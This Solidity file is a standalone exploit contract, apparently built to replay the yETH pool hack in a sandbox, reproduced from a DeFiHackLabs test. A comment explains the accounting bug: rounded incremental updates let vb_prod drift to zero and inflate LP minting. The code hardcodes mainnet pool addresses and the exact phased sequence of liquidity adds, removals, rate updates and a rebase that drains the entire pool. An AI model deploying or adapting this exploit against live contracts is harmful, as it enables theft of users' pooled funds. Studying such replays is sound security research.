// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// SYNTHETIC exploit for the EVM Playground — a standalone contract reproducing the inline attack from
// DeFiHackLabs' yETH_exp.sol (the Foundry test runs the whole exploit as address(this)). The 8-asset
// INITIAL_BALANCE funding, the phase-1 YETH deal, and every approve() are unrecorded — the playground's
// dealToken/rawCall setup steps handle them (mirrors the `deal()`+approve pattern the test's
// _setupInitialBalances() does before the attack proper begins). run() copies
// _initialRateUpdate()+_executeExploitSequence() verbatim (minus _takeInitialsBack(), which is pure
// test-accounting sugar — the playground's profitReceiver re-baseline achieves the same "seed capital
// doesn't count as profit" effect automatically).
//
// Bug: the pool's `vb_prod`/`vb_sum` accumulators are updated INCREMENTALLY (via rounded _pow_up/_pow_down
// power terms) instead of recomputed from scratch on every add/remove. A carefully tuned sequence of
// balanced add/remove cycles, single-asset deposits, and rate-recomputations drifts the stored vb_prod to
// EXACTLY 0. With vb_prod=0, _calc_supply's D-invariant recursion loses its correction term and solves for
// a hugely inflated supply, so add_liquidity mints far more LP than the deposit backs. The final
// remove_liquidity(pool.supply(), ...) burns the now-wildly-over-minted LP for a balanced pro-rata
// withdrawal — since the attacker's LP share is ~100% of an inflated supply, this drains the ENTIRE pool.

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IPool {
    function supply() external view returns (uint256);
    function remove_liquidity(uint256 _lp_amount, uint256[] calldata _min_amounts, address _receiver) external;
    function assets(uint256 index) external view returns (address);
    function add_liquidity(uint256[] calldata _amounts, uint256 _min_lp_amount, address _receiver)
        external
        returns (uint256);
    function update_rates(uint256[] calldata _assets) external;
}

interface IOETH {
    function rebase() external;
}

contract YETHExploit {
    uint256 constant NUM_ASSETS = 8;

    IPool constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IOETH constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);

    function run() external {
        _initialRateUpdate();
        _executeExploitSequence();
    }

    function _initialRateUpdate() internal {
        uint256[] memory rates = new uint256[](8);
        for (uint256 i = 0; i < 6; i++) {
            rates[i] = i;
        }
        POOL.update_rates(rates);
    }

    function _executeExploitSequence() internal {
        // Phase 1: initial manipulation (YETH balance pre-funded via setup dealToken)
        uint256 removeAmount = 416_373_487_230_773_958_294;
        _removeLiquidity(removeAmount);

        // Phase 2-5: multiple add/remove cycles
        _addLiquidity(_getPhase2Amounts());
        _removeLiquidity(2_789_348_310_901_989_968_648);
        _addLiquidity(_getPhase3Amounts());
        _removeLiquidity(7_379_203_011_929_903_830_039);
        _addLiquidity(_getPhase4Amounts());
        _removeLiquidity(7_066_638_371_690_257_003_757);
        _addLiquidity(_getPhase5Amounts());
        _removeLiquidity(3_496_158_478_994_807_127_953);

        // Phase 6: complex manipulation with rate updates
        _addLiquidity(_getPhase6Add1Amounts());
        _addLiquidity(_getSingleAssetAmounts(3, 20_605_468_750_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(8_434_932_236_461_542_896_540);

        // Phase 7: rebase exploitation
        OETH.rebase();
        _addLiquidity(_getPhase7Add1Amounts());
        _addLiquidity(_getPhase7Add2Amounts());

        // Phase 8: additional manipulation
        _addLiquidity(_getSingleAssetAmounts(3, 57_226_562_500_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(9_237_030_802_829_017_297_880);
        _addLiquidity(_getPhase8Add1Amounts());
        _addLiquidity(_getPhase8Add2Amounts());
        _addLiquidity(_getSingleAssetAmounts(3, 318_750_000_000_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(7);

        // Final drain
        uint256 poolSupply = POOL.supply();
        _removeLiquidity(poolSupply);

        uint256[8] memory finalAmounts;
        for (uint256 i = 0; i < NUM_ASSETS - 1; i++) {
            finalAmounts[i] = 1;
        }
        finalAmounts[7] = 9;
        _addLiquidity(finalAmounts);
    }

    function _addLiquidity(uint256[8] memory amounts) internal {
        uint256[] memory amountsArray = new uint256[](NUM_ASSETS);
        for (uint256 i = 0; i < NUM_ASSETS; i++) {
            amountsArray[i] = amounts[i];
        }
        POOL.add_liquidity(amountsArray, 0, address(this));
    }

    function _removeLiquidity(uint256 amount) internal {
        POOL.remove_liquidity(amount, new uint256[](NUM_ASSETS), address(this));
    }

    function _updateSingleRate(uint256 assetIndex) internal {
        uint256[] memory rates = new uint256[](1);
        rates[0] = assetIndex;
        POOL.update_rates(rates);
    }

    function _getSingleAssetAmounts(uint256 index, uint256 amount)
        internal
        pure
        returns (uint256[8] memory amounts)
    {
        amounts[index] = amount;
    }

    function _getPhase2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 610_669_608_721_347_951_666;
        amounts[1] = 777_507_145_787_198_969_404;
        amounts[2] = 563_973_440_562_370_010_057;
        amounts[4] = 476_460_390_272_167_461_711;
    }

    function _getPhase3Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_636_245_238_220_874_001_286;
        amounts[1] = 1_531_136_279_659_070_868_194;
        amounts[2] = 1_041_815_511_903_532_551_187;
        amounts[4] = 991_050_908_418_104_947_336;
        amounts[5] = 1_346_008_005_663_580_090_716;
    }

    function _getPhase4Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_630_811_661_792_970_363_090;
        amounts[1] = 1_526_051_744_772_289_698_092;
        amounts[2] = 1_038_108_768_586_660_585_581;
        amounts[4] = 969_651_157_511_131_341_121;
        amounts[5] = 1_363_135_138_655_820_584_263;
    }

    function _getPhase5Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 859_805_263_416_698_094_503;
        amounts[1] = 804_573_178_584_505_833_740;
        amounts[2] = 546_933_182_262_586_953_508;
        amounts[4] = 510_865_922_059_584_325_991;
        amounts[5] = 723_182_384_178_548_055_243;
    }

    function _getPhase6Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_784_169_320_136_805_803_209;
        amounts[1] = 1_669_558_029_141_448_703_194;
        amounts[2] = 1_135_991_585_797_559_066_395;
        amounts[4] = 1_061_079_136_814_511_050_837;
        amounts[5] = 1_488_254_960_317_842_892_500;
    }

    function _getPhase7Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_049_508_928_999_413_985_639;
        amounts[1] = 982_090_679_001_395_746_930;
        amounts[2] = 667_668_088_369_153_429_906;
        amounts[4] = 623_639_019_639_346_230_238;
        amounts[5] = 878_771_594_643_399_886_538;
    }

    function _getPhase7Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 919_888_612_738_016_815_095;
        amounts[1] = 860_796_899_699_397_749_576;
        amounts[2] = 586_033_288_771_470_394_081;
        amounts[4] = 547_387_589_810_030_997_702;
        amounts[5] = 763_397_793_689_173_373_329;
    }

    function _getPhase8Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 417_517_891_458_429_416_749;
        amounts[1] = 390_697_418_752_374_378_114;
        amounts[2] = 264_940_493_241_640_253_533;
        amounts[4] = 247_469_112_791_605_057_921;
        amounts[5] = 355_235_146_731_093_304_055;
    }

    function _getPhase8Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_779_325_564_746_959_656_328;
        amounts[1] = 1_665_025_426_427_657_662_239;
        amounts[2] = 1_133_554_647_882_989_836_457;
        amounts[4] = 1_058_802_901_663_485_490_031;
        amounts[5] = 1_476_627_921_656_231_103_547;
    }
}
